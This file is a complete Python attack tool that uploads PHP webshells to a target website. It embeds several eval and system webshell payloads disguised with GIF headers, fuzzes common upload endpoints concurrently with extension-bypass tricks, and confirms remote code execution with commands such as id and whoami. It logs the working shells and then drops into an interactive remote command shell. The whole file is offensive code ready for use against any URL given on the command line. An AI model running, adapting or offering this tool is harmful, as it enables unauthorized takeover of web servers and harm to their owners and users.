#!/usr/bin/env python3
import requests
import sys
import random
import string
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor

class WebShellUploader:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.php_session = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        self.session.cookies.set('PHPSESSID', self.php_session)
        
        # Multiple webshell payloads (bypass different WAFs)
        self.shells = [
            '''GIF89a<?php @error_reporting(0);$s=$_POST['p'];@eval($s);?>''',
            '''GIF89a<?php error_reporting(0);$c=$_REQUEST['c'];@eval($c);?>''',
            '''GIF89a<?php @extract($_POST);@eval($p);?>''',
            '''GIF89a<?php if(isset($_POST['cmd'])){echo `<pre>`;system($_POST['cmd']);echo `</pre>`;}?>'''
        ]
        
        # Common upload endpoints
        self.endpoints = [
            '/upload.php', '/index.php?act=upload', '/file.php', '/upload/index.php',
            '/admin/upload.php', '/manager/upload.php', '/editor/upload.php',
            '/upload/', '/files/', '/uploads/', '/images/'
        ]
        
        # Common file extensions for bypass
        self.extensions = ['.gif', '.jpg', '.png', '.php.gif', '.phtml', '.php5']
    
    def generate_filename(self, ext):
        return f"shell{random.randint(1000,9999)}{ext}"
    
    def upload_via_endpoint(self, endpoint, shell_idx):
        """Try upload via specific endpoint with specific shell"""
        url = f"{self.target}{endpoint}"
        filename = self.generate_filename('.gif')
        
        files = {
            'file': (filename, self.shells[shell_idx], 'image/gif'),
            'Filedata': (filename, self.shells[shell_idx], 'image/gif'),
            'upload': (filename, self.shells[shell_idx], 'image/gif')
        }
        
        data = {
            'MAX_FILE_SIZE': '2097152'
        }
        
        try:
            for file_key in files:
                response = self.session.post(
                    url, 
                    files={file_key: files[file_key]}, 
                    data=data,
                    timeout=15,
                    allow_redirects=True
                )
                
                # Check for success indicators
                success_indicators = [
                    'success', 'uploaded', 'upload success', filename,
                    'shell', f"{filename.split('.')[0]}", '200 OK'
                ]
                
                if any(indicator.lower() in response.text.lower() for indicator in success_indicators):
                    # Try to find shell location in response
                    shell_url = self.extract_shell_url(response.text, filename)
                    if shell_url:
                        return shell_url
                
                # Try direct access patterns
                for ext in self.extensions:
                    test_url = f"{self.target}/{filename.replace('.gif', ext)}"
                    test_resp = self.session.head(test_url, timeout=10)
                    if test_resp.status_code == 200:
                        return test_url
                        
        except Exception:
            pass
        
        return None
    
    def extract_shell_url(self, content, filename):
        """Extract potential shell URL from upload response"""
        patterns = [
            f"{filename}",
            filename.split('.')[0],
            '/uploads/' + filename,
            '/files/' + filename,
            '/tmp/' + filename
        ]
        
        for pattern in patterns:
            if pattern in content:
                return urllib.parse.urljoin(self.target, pattern)
        return None
    
    def test_rce(self, shell_url):
        """Test RCE with multiple commands"""
        test_commands = [
            "id",
            "whoami", 
            "uname -a",
            "php -r 'echo \"RCE_OK\";'"
        ]
        
        for cmd in test_commands:
            payloads = [
                f"system('{cmd}');",
                f"echo `{cmd}`;",
                f"passthru('{cmd}');",
                f"shell_exec('{cmd}');"
            ]
            
            for payload in payloads:
                try:
                    resp = self.session.post(
                        shell_url,
                        data={'p': payload, 'c': payload, 'cmd': cmd},
                        timeout=10
                    )
                    
                    if any(ind in resp.text for ind in ['uid=', 'www-data', 'root', 'daemon', 'RCE_OK', cmd]):
                        return True, resp.text.strip()
                except:
                    continue
        return False, None
    
    def fuzz_endpoints(self):
        """Fuzz all endpoints with all shells concurrently"""
        print("[*] Fuzzing upload endpoints...")
        futures = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            for endpoint in self.endpoints:
                for shell_idx in range(len(self.shells)):
                    future = executor.submit(self.upload_via_endpoint, endpoint, shell_idx)
                    futures.append(future)
            
            for i, future in enumerate(futures):
                if i % 10 == 0:
                    print(f"[*] Progress: {i}/{len(futures)}")
                
                result = future.result(timeout=30)
                if result:
                    print(f"[+] Shell found: {result}")
                    rce_success, output = self.test_rce(result)
                    if rce_success:
                        self.save_success(result, output)
                        return result
        return None
    
    def save_success(self, shell_url, output):
        """Save successful shell info"""
        with open('shells.txt', 'a') as f:
            f.write(f"{shell_url}\nOutput: {output}\n\n")
        print(f"[+] Saved to shells.txt")
    
    def interactive_shell(self, shell_url):
        """Interactive shell mode"""
        print(f"\n[*] Interactive shell: {shell_url}")
        print("[*] Type 'exit' to quit, 'help' for commands")
        
        while True:
            cmd = input("shell> ").strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            if cmd.lower() == 'help':
                print("Commands: id, whoami, uname -a, ls, pwd, cat /etc/passwd")
                continue
            
            resp = self.session.post(shell_url, data={'p': f"system('{cmd}');"})
            print(resp.text.strip() or "No output")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 shell.py http://target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    uploader = WebShellUploader(target)
    
    print(f"[*] Targeting: {target}")
    print(f"[*] Session: {uploader.php_session}")
    
    shell_url = uploader.fuzz_endpoints()
    
    if shell_url:
        print(f"\n[*] SUCCESS! Webshell: {shell_url}")
        print(f"[*] Test: curl -d 'p=system(id);' '{shell_url}'")
        uploader.interactive_shell(shell_url)
    else:
        print("[-] No shell uploaded. Try manual enumeration.")
        print("[*] Common paths to check manually:")
        for path in uploader.endpoints:
            print(f"  {target}{path}")

if __name__ == "__main__":
    main()